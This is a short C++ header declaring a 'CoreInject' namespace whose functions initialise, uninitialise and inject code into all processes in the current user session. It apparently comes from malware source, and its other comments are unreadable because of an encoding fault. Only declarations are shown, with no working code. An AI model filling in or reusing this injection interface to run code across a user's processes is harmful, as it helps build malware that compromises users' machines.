/*
  �������� ���� � ��������.
*/
#pragma once

namespace CoreInject
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*    Inject code into all processes of the current session by the current user.

    Return - true - if there was inject At least in one process
             false - unless one injection produce is not produced.
  */
  bool _injectToAll(void);
};
